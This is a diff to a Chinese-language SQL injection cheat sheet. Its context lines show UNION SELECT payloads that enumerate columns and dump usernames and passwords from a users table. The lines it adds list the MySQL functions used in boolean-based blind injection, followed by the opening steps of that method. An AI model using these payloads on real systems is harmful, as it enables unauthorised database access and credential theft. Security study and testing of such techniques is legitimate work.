@@ -52,6 +52,14 @@ UNION SELECT 1,2,group_concat(column_name) from information_schema.columns where
 UNION SELECT 1,2,group_concat(id,username,password) from users –+ 查询字段值
 ```
 ### 布尔注入
+```
+mid(str,1,3)字符串截取
+ORD()转换成ascii码
+Length()统计字节长度
+version()查看数据库版本
+database()查看数据库名
+user()查看当前用户
+```
 1. 判断注入点
 2. 获取数据库名称长度
 ```
